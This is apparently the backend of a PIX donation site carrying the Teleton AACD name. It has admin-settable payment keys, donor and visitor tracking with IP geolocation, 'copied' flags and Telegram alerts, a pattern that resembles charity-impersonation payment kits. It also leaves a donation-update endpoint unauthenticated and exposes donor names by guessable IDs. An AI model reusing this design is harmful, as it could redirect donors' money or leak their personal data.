from fastapi import APIRouter, HTTPException, Depends, Query, Request
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from datetime import datetime, timezone
import jwt
import os
import httpx
from pix_generator import generate_pix_payload
from email_service import send_donation_receipt, send_donation_reminder
from telegram_bot import (
    notify_donation_created,
    notify_donation_copied,
    set_db as set_telegram_db,
    get_chat_id,
    _get_token as get_bot_token,
)

router = APIRouter(prefix="/api/admin")
security = HTTPBearer()

SECRET_KEY = os.environ['JWT_SECRET']

# Reference to db - set by server.py
db = None

def set_db(database):
    global db
    db = database
    set_telegram_db(database)

class LoginRequest(BaseModel):
    username: str
    password: str

class DonationCreate(BaseModel):
    value: float
    pix_code: str
    donor_name: str = ""
    donor_document: str = ""
    donor_phone: str = ""
    donor_email: str = ""
    device: str = ""
    tax_deduction: bool = False
    origin: str = ""

class DonationUpdate(BaseModel):
    copied: bool

class PixKeyUpdate(BaseModel):
    pix_key: str
    beneficiary_name: str = ""
    city: str = ""

ADMIN_USERNAME = os.environ["ADMIN_USERNAME"]
ADMIN_PASSWORD = os.environ["ADMIN_PASSWORD"]

def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload
    except Exception:
        raise HTTPException(status_code=401, detail="Token invalido ou expirado")

@router.post("/login")
async def login(request: LoginRequest):
    if request.username == ADMIN_USERNAME and request.password == ADMIN_PASSWORD:
        token = jwt.encode({"username": request.username}, SECRET_KEY, algorithm="HS256")
        return {"token": token, "username": request.username}
    raise HTTPException(status_code=401, detail="Credenciais invalidas")

@router.get("/donations")
async def get_donations(user=Depends(verify_token)):
    donations = await db.donations.find({}, {"_id": 0}).sort("created_at", -1).to_list(1000)
    return donations

async def get_location_from_ip(ip: str) -> str:
    """Busca cidade/estado a partir do IP do usuário"""
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName&lang=pt-BR")
            data = resp.json()
            if data.get("status") == "success" and data.get("city"):
                return f"{data['city']}/{data.get('regionName', '')}"
    except Exception:
        pass
    return ""

@router.post("/donations")
async def create_donation(donation: DonationCreate, request: Request):
    # Capturar IP real do usuário
    client_ip = request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
    location = await get_location_from_ip(client_ip)

    donation_dict = {
        "donation_id": str(int(datetime.now(timezone.utc).timestamp() * 1000)),
        "value": donation.value,
        "pix_code": donation.pix_code,
        "donor_name": donation.donor_name,
        "donor_document": donation.donor_document,
        "donor_phone": donation.donor_phone,
        "donor_email": donation.donor_email,
        "device": donation.device,
        "location": location,
        "tax_deduction": donation.tax_deduction,
        "origin": donation.origin,
        "copied": False,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.donations.insert_one(donation_dict)
    telegram_msg_id = await notify_donation_created(donation.value, donation.donor_name, donation.device, location, donation.origin)
    if telegram_msg_id:
        await db.donations.update_one(
            {"donation_id": donation_dict["donation_id"]},
            {"$set": {"telegram_message_id": telegram_msg_id}}
        )

    # Enviar recibo por e-mail apenas para doações NÃO anônimas (com nome e e-mail)
    email_sent = False
    if donation.donor_name and donation.donor_email:
        email_sent = await send_donation_receipt(
            donor_name=donation.donor_name,
            donor_email=donation.donor_email,
            value=donation.value,
            donation_id=donation_dict["donation_id"],
        )
        await db.donations.update_one(
            {"donation_id": donation_dict["donation_id"]},
            {"$set": {"email_sent": email_sent}}
        )

    return {
        "donation_id": donation_dict["donation_id"],
        "value": donation_dict["value"],
        "pix_code": donation_dict["pix_code"],
        "donor_name": donation_dict["donor_name"],
        "device": donation_dict["device"],
        "location": donation_dict["location"],
        "copied": donation_dict["copied"],
        "email_sent": email_sent,
        "created_at": donation_dict["created_at"]
    }

@router.patch("/donations/{donation_id}")
async def update_donation(donation_id: str, update: DonationUpdate):
    result = await db.donations.update_one(
        {"donation_id": donation_id},
        {"$set": {"copied": update.copied}}
    )
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Doacao nao encontrada")
    if update.copied:
        await notify_donation_copied(donation_id)
    return {"message": "Doacao atualizada"}

@router.delete("/donations/{donation_id}")
async def delete_donation(donation_id: str, user=Depends(verify_token)):
    result = await db.donations.delete_one({"donation_id": donation_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Doacao nao encontrada")
    return {"message": "Doacao removida"}


@router.get("/config")
async def get_config(user=Depends(verify_token)):
    config_docs = await db.config.find({}, {"_id": 0}).to_list(50)
    values = {c["key"]: c.get("value", "") for c in config_docs}
    return {
        "pix_key": values.get("pix_key", ""),
        "beneficiary_name": values.get("beneficiary_name", ""),
        "city": values.get("city", ""),
    }

@router.put("/config/pix-key")
async def update_pix_key(data: PixKeyUpdate, user=Depends(verify_token)):
    await db.config.update_one({"key": "pix_key"}, {"$set": {"value": data.pix_key}}, upsert=True)
    await db.config.update_one({"key": "beneficiary_name"}, {"$set": {"value": data.beneficiary_name}}, upsert=True)
    await db.config.update_one({"key": "city"}, {"$set": {"value": data.city}}, upsert=True)
    return {"message": "Chave PIX atualizada"}

class TelegramConfig(BaseModel):
    chat_id: str = ""
    bot_token: str = ""
    enabled: bool = True

@router.get("/config/telegram")
async def get_telegram_config(user=Depends(verify_token)):
    config_docs = await db.config.find({}, {"_id": 0}).to_list(50)
    values = {c["key"]: c.get("value", "") for c in config_docs}
    db_token = values.get("telegram_bot_token", "")
    env_token = get_bot_token()
    # Mostra token do DB se existir, senao mostra que ha token no env (mascarado)
    token_to_show = db_token if db_token else ("__ENV__" if env_token else "")
    enabled_val = values.get("telegram_enabled", "true")
    return {
        "chat_id": values.get("telegram_chat_id", ""),
        "bot_token": token_to_show,
        "bot_configured": bool(db_token or env_token),
        "enabled": enabled_val != "false",
    }

@router.put("/config/telegram")
async def update_telegram_config(data: TelegramConfig, user=Depends(verify_token)):
    await db.config.update_one({"key": "telegram_chat_id"}, {"$set": {"value": data.chat_id}}, upsert=True)
    # Nao sobrescreve o token quando o front devolve o placeholder __ENV__
    if data.bot_token and data.bot_token != "__ENV__":
        await db.config.update_one({"key": "telegram_bot_token"}, {"$set": {"value": data.bot_token}}, upsert=True)
    await db.config.update_one({"key": "telegram_enabled"}, {"$set": {"value": "true" if data.enabled else "false"}}, upsert=True)
    return {"message": "Telegram configurado"}

@router.post("/config/telegram/detect")
async def detect_telegram_chat(user=Depends(verify_token)):
    """Detecta automaticamente o chat_id do grupo onde o bot foi adicionado."""
    from telegram_bot import _get_token_async
    token = await _get_token_async()
    if not token:
        raise HTTPException(status_code=400, detail="Token do bot nao configurado")
    async with httpx.AsyncClient() as client:
        r = await client.get(f"https://api.telegram.org/bot{token}/getUpdates")
        data = r.json()
    if not data.get("ok") or not data.get("result"):
        raise HTTPException(status_code=404, detail="Nenhuma mensagem encontrada. Envie uma mensagem no grupo primeiro.")
    chats = {}
    for update in data["result"]:
        msg = update.get("message") or update.get("my_chat_member", {}).get("chat")
        if msg:
            chat = msg.get("chat") or msg
            if chat.get("type") in ("group", "supergroup"):
                chats[str(chat["id"])] = chat.get("title", "Grupo")
    if not chats:
        raise HTTPException(status_code=404, detail="Bot nao foi adicionado a nenhum grupo ainda.")
    chat_id = list(chats.keys())[0]
    chat_name = chats[chat_id]
    await db.config.update_one(
        {"key": "telegram_chat_id"},
        {"$set": {"value": chat_id}},
        upsert=True
    )
    return {"chat_id": chat_id, "chat_name": chat_name, "message": f"Grupo '{chat_name}' detectado e configurado!"}

@router.post("/config/telegram/test")
async def test_telegram(user=Depends(verify_token)):
    """Envia mensagem de teste no grupo."""
    from telegram_bot import send_message
    chat_id = await get_chat_id()
    if not chat_id:
        raise HTTPException(status_code=400, detail="Chat ID nao configurado")
    await send_message("✅ <b>Teste de conexão</b>\n\nBot Teleton AACD conectado com sucesso!")
    return {"message": "Mensagem de teste enviada"}


@router.get("/stats")
async def get_stats(user=Depends(verify_token)):
    donations = await db.donations.find({}, {"_id": 0}).to_list(1000)
    total = sum(d.get("value", 0) for d in donations)
    copied_count = sum(1 for d in donations if d.get("copied", False))
    copied_value = sum(d.get("value", 0) for d in donations if d.get("copied", False))
    return {
        "total_value": total,
        "total_donations": len(donations),
        "copied_count": copied_count,
        "copied_value": copied_value
    }

@router.delete("/donations")
async def clear_donations(user=Depends(verify_token)):
    result = await db.donations.delete_many({})
    return {"message": f"{result.deleted_count} doações removidas"}


@router.post("/send-reminders")
async def send_reminders(user=Depends(verify_token)):
    """Envia e-mail de lembrete para todos os doadores com e-mail cadastrado (um por e-mail, usando a doação mais recente)."""
    donations = await db.donations.find(
        {"donor_email": {"$nin": ["", None]}}, {"_id": 0}
    ).sort("created_at", -1).to_list(5000)

    # Deduplica por e-mail mantendo a doação mais recente
    latest_by_email = {}
    for d in donations:
        email = (d.get("donor_email") or "").strip()
        if email and email not in latest_by_email:
            latest_by_email[email] = d

    sent = 0
    failed = 0
    for email, d in latest_by_email.items():
        ok = await send_donation_reminder(
            donor_name=d.get("donor_name", ""),
            donor_email=email,
            value=d.get("value", 0),
            donation_id=d.get("donation_id", ""),
        )
        if ok:
            sent += 1
        else:
            failed += 1

    return {"sent": sent, "failed": failed, "total_recipients": len(latest_by_email)}



# ============ ENDPOINTS PUBLICOS (sem auth) ============

# Gerar payload PIX valido
@router.get("/pix/generate")
async def generate_pix(value: float = Query(..., gt=0)):
    config_docs = await db.config.find({}, {"_id": 0}).to_list(50)
    values = {c["key"]: c.get("value", "") for c in config_docs}
    pix_key = values.get("pix_key", "")
    if not pix_key:
        raise HTTPException(status_code=400, detail="Chave PIX nao configurada no painel")

    payload = generate_pix_payload(
        pix_key=pix_key,
        amount=value,
        merchant_name=values.get("beneficiary_name") or "AACD",
        merchant_city=(values.get("city") or "SAO PAULO").upper(),
    )
    return {"pix_code": payload, "pix_key": pix_key}

# Obter chave PIX publica (sem detalhes sensíveis, apenas se existe)
@router.get("/pix/status")
async def pix_status():
    config = await db.config.find_one({"key": "pix_key"}, {"_id": 0})
    has_key = bool(config and config.get("value"))
    return {"configured": has_key}


# Reconstruir sessao de doacao a partir do ID (usado pelo botao "Doar" do e-mail)
@router.get("/donation/{donation_id}")
async def get_donation_public(donation_id: str):
    doc = await db.donations.find_one({"donation_id": donation_id}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Doacao nao encontrada")
    return {
        "donation_id": doc.get("donation_id"),
        "value": doc.get("value"),
        "pix_code": doc.get("pix_code", ""),
        "donor_name": doc.get("donor_name", ""),
        "copied": doc.get("copied", False),
    }


# ========== VISITS TRACKING ==========

class VisitCreate(BaseModel):
    device: str = ""
    origin: str = ""

@router.post("/visits/track")
async def track_visit(visit: VisitCreate, request: Request):
    client_ip = request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
    location = await get_location_from_ip(client_ip)

    visit_dict = {
        "device": visit.device,
        "ip": client_ip,
        "location": location,
        "origin": visit.origin,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.visits.insert_one(visit_dict)
    return {"status": "ok"}

@router.get("/visits")
async def get_visits(user=Depends(verify_token)):
    total = await db.visits.count_documents({})
    visits = await db.visits.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return {"total": total, "visits": visits}


@router.delete("/visits")
async def clear_visits(user=Depends(verify_token)):
    await db.visits.delete_many({})
    return {"status": "ok"}
